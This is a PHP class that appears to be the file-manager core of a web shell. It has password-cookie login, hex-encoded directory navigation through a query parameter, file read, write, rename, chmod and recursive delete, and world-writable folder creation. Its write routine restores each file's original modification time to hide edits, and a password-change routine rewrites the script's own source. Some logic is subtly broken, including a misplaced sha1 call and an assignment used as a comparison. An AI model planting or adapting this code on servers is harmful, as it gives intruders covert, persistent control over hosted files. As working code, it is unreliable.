<?php
/**
 *
 */
class FileSystem
{
	public $path;

	protected $cookie;
	protected $password;
	protected $post;
	protected $get;
	protected $result;
	protected $filename;
	protected $dir;
	protected $file;
	protected $cwd;
	protected $open;
	protected $expired = [
		60, // 1 second
		60*60, // 1 minute
		60*60*1, // 1 hour
		60*60*24, // 1 day
		60*60*24*30, // 1 month
		60*60*24*30*12 // 1 year
	];
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
		$this->post = $_POST;
		$this->get = $_GET;
		$this->cookie = $_COOKIE;
	}

	/*
		Function Login
	*/

	public function auth($password)
	{
		$this->password = $password;
		return $this;
	}

	public function pageLogin()
	{
		?>
		<form method="post">
			<input type="password" name="password">
		</form>
		<?php
	}

	public function login()
	{
		if (isset($this->password) && (trim($this->password) != "")) {
			if (isset($this->post["password"])) {
				if (sha1(md5($this->post["password"]) === $this->password)) {
					setcookie("password", $this->password, time() + $this->expired[4], "/");
					header("Location: {$_SERVER['PHP_SELF']}");
				} else {
					echo "wrong password !";
				}
			}
			if (!isset($this->cookie["password"]) || ((isset($this->cookie["password"]) && ($this->cookie["password"] != $this->password)))) {
				$this->pageLogin();
				die();
			}
		}
	}

	public function logout()
	{
		if (isset($this->cookie["password"])) {
			setcookie("password", "", time() - 1);
			header("Location: {$_SERVER['PHP_SELF']}");
		}
	}

	/*
		end Function Login
	*/


	/*
		Function listFiles
	*/

	public function list($type)
	{
		$this->result = [];
		foreach (scandir($this->path) as $key => $value) {
			$filename = 
				[
					$this->path . DIRECTORY_SEPARATOR . $value,
					$value
				];

			switch ($type) {
				case 'dir':
					if (!is_dir($filename[0]) || $value === "." || $value === "..") continue 2;
					break;
				
				case 'file':
					if (!is_file($filename[0])) continue 2;
					break;
			}
			$this->result[] = $filename;
		} return $this->result;
	}

	public function dirs()
	{
		return $this->list("dir");
	}

	public function filef()
	{
		return $this->list("file");
	}

	/*
		end Function listFiles
	*/


	/*
		end Function hex and unhex
	*/

	public static function strtohex($string)
	{
		$str = "";
        for ($i=0; $i < strlen($string) ; $i++) { 
            $str .= dechex(ord($string[$i]));
        } return $str;
	}

	public static function hextostr($hex)
	{
		$unhex = "";
        for ($i=0; $i < strlen($hex)-1 ; $i+=2) { 
            $unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
        } return $unhex;
	}

	/*
		end Function hex and unhex
	*/


	/*
		Function cd
	*/

	public static function cd($directory)
	{
		return chdir($directory);
	}

	/*
		Function cd
	*/

	/*
		Function pwd
	*/

	public function pwd()
	{
		$path = preg_split("/(\\\|\/)/", $this->path);
		foreach ($path as $key => $value) {
			if ($value == "" && $key = 0) {
				print("<a href='?x=2f'>2f</a>");
			}
			if ($value == "") continue;
			print("<a href='?x=");
			for ($i=0; $i <= $key ; $i++) { 
				print(self::strtohex($path[$i]));
				if ($i != $key) {
					print("2f");
				}
			} print("'>{$value}</a>/");
		}
	}

	/*
		Function pwd
	*/

	/*
		Function writeable
	*/

	public function writeable($filename, $perms)
	{
		return (is_writable($filename)) ? "<font color='green'>{$perms}</font>" : "<font color='red'>{$perms}</font>";
	}

	/*
		Function path
	*/

	/*
		Function path
	*/

	public function path($path)
	{
		$this->cwd = $path;
		return $this;
	}

	/*
		end Function path
	*/

	/*
		Function getExtension
	*/

	public function getExtension($filename)
	{
		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
	}

	/*
		end Function getExtension
	*/

	/*
		Function ftime
	*/

	public function ftime($filename)
	{
		return filemtime($filename);
	}

	/*
		Function ftime
	*/

	/*
		Function action
	*/

	public function get($filename)
	{
		$this->filename = $filename;
		return $this;
	}

	public function open($mode)
	{
		$this->open = fopen($this->filename, $mode);
		return $this;
	}

	public function read()
	{
		return htmlspecialchars(file_get_contents($this->filename));
	}

	public function write($data)
	{
		fwrite($this->open, $data);
		$ftime = $this->ftime($this->filename); 
		if ($ftime === false) return false;
		return touch($this->filename, $ftime);
	}

	public function chname($newname)
	{
		return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
	}

	public function chmod($mode)
	{
		return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
	}

	/*
		end Function action
	*/

	/*
		Function Delete
	*/

	public function delete($filename)
	{
		if (is_dir($filename)) {
			foreach (scandir($filename) as $key => $value) {
				if ($value != "." && $value != "..") {
					if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
						$this->delete($filename . DIRECTORY_SEPARATOR . $value);
					} else {
						unlink($filename . DIRECTORY_SEPARATOR . $value);
					}
				}
			} if (@rmdir($filename)) {
				return true;
			} else {
				return false;
			}
		} else {
			if (unlink($filename)) {
				return true;
			} else {
				return false;
			}
		}
	}

	/*
		end Function Delete
	*/

	/*
		Function make file & folder
	*/

	public function make($filename)
	{
		$this->filename = $filename;
		return $this;
	}

	public function folder()
	{
		return mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->filename, 0777);
	}

	public function file($data)
	{
		foreach ($this->filename as $key => $value) {
			$separate = explode(",", $this->filename[$key]);
			foreach ($separate as $id => $file) {
				$this->get($file)->open("w")->write("jancok");
			}
		}
	}

	/*
		end Function make file & dir
	*/

	/*
		Function changepassword
	*/

	public function changepassword($string)
	{
		$newpassword = sha1(md5($string));
		$newpassword = "\$password = \"".$newpassword."\";";
		$option = file_get_contents($_SERVER['SCRIPT_FILENAME']);
		$option = preg_replace("/\\\$password\ *=\ *[\'\"]*([a-fA-F0-9]*)[\'\"];*/is", $newpassword, $option);
		return file_put_contents($_SERVER['SCRIPT_FILENAME'], $option);
	}

	/*
		end Function changepassword
	*/

}
